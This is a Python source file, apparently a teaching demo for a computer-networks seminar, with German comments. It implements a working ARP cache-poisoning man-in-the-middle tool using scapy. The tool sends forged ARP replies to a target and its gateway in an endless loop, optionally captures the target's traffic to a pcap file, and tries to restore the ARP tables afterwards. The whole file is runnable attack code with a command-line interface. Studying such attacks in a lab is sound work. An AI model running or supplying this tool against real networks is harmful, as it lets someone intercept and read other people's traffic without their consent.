import os
import sys
import time 
import argparse
from multiprocessing import Process


from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send,
                        sniff, sndrcv, srp, wrpcap)


# Demo für Rechnernetze

class ArpDemo:
    def __init__(self, target :str,
                 gateway: str,
                 interface: str,
                 verbose:bool=False,
                 outfile:str="arp.pcap",
                 pcount:int=100,
                 use_sniffer:bool=False) -> None:
        self.target= target
        self.taget_mac = Helper.get_mac(target)
        self.gateway= gateway
        self.gateway_mac = Helper.get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        self.outfile = outfile
        self.pcount = pcount
        self.verbose = verbose
        self.use_sniffer = use_sniffer

        if(verbose):
            print("-"*15, "INIT", "-"*15)
            print("Verwende Interface: {interface}".format(interface=self.interface))
            print("Target {tg} @ {tg_mac}".format(tg=self.target,tg_mac=self.taget_mac))
            print("Gateway {gw} @ {gw_mac}".format(gw=self.gateway,gw_mac=self.gateway_mac))
            print("-"*36)

    def run(self):
        self.attack_thread = Process(target=self.poison)
        self.attack_thread.start()

        if(self.use_sniffer):
            self.sniffer_thread = Process(target=self.sniffer(self.pcount))
            self.sniffer_thread.start()

    def poison(self):
        # Fake ARP Request erstellen

        # Für Target
        target = ARP()
        target.op = 2
        target.psrc = self.gateway
        target.pdst = self.target
        target.hwdst = self.taget_mac
        print(target.summary())

        # Für Gateway
        gateway = ARP()
        gateway.op = 2
        gateway.psrc = self.target
        gateway.pdst = self.gateway
        gateway.hwdst = self.gateway_mac
        print(gateway.summary())
        print("-"*36)

        while True:
            sys.stdout.flush()
            print("-"*36)
            try:
                send(target)
                send(gateway)
            except KeyboardInterrupt:
                self.cleanup()
                sys.exit()
            else:
                time.sleep(1)

    def sniffer(self, count:int):
        if(self.verbose):
            print("Beginne mit capture von {c} Paketen in Datei {fd}".format(c=self.pcount, fd=self.outfile))
        filter = "ip host {target}".format(target=self.target)
        packets = sniff(count=count, filter = filter, iface=self.interface)
        wrpcap(self.outfile, packets)
        self.cleanup()
        self.attack_thread.terminate()

    def cleanup(self):
        if(self.verbose):
            print("ARP Tabelle wiederherstellen")
            send(ARP(
                op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.target, hwdst='ff:ff:ff:ff:ff:ff'), 5
            )
            send(ARP(
                op=2, psrc=self.target, hwsrc=self.taget_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), 5
            )

class Helper():
    @staticmethod
    def get_mac(ip: str, verbose: bool=False):
        #Broadcast Packet mit Arp request erstellen 
        packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=ip)
        response, _ = srp(packet, timeout=2, retry=10, verbose=verbose)
        for _, r in response:
            if(verbose == True):
                print("MAC Addresse für ip {ip} ist {hwadd}".format(ip=ip, hwadd=r[Ether].src))
            return r[Ether].src
        return None


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description = "Arp Tool für das Rechnernetze Seminar"
    parser.add_argument("-t", "--target", help="Target Ip Addresse", type=str)
    parser.add_argument("-g", "--gateway", help="Gateway Ip Addresse", type=str)
    parser.add_argument("-i", "--interface", help="Interface", type=str)
    parser.add_argument("-v", "--verbose", help="Debug Ausgaben", action="store_true", default=False)
    parser.add_argument("-s", "--sniffer", help="Netwerktraffic sniffen und als pcap speichern", action="store_true", default=False)
    parser.add_argument("-o", "--outfile", help="outfile für pcap capture", default="arp.pcap", type=str)
    parser.add_argument("-c", "--count", help="Anzahl an Paketen für pcap capture", default=100, type=int)
    args = parser.parse_args()
    arper = ArpDemo(args.target, args.gateway, args.interface, args.verbose, args.outfile, args.count, args.sniffer)
    arper.run()

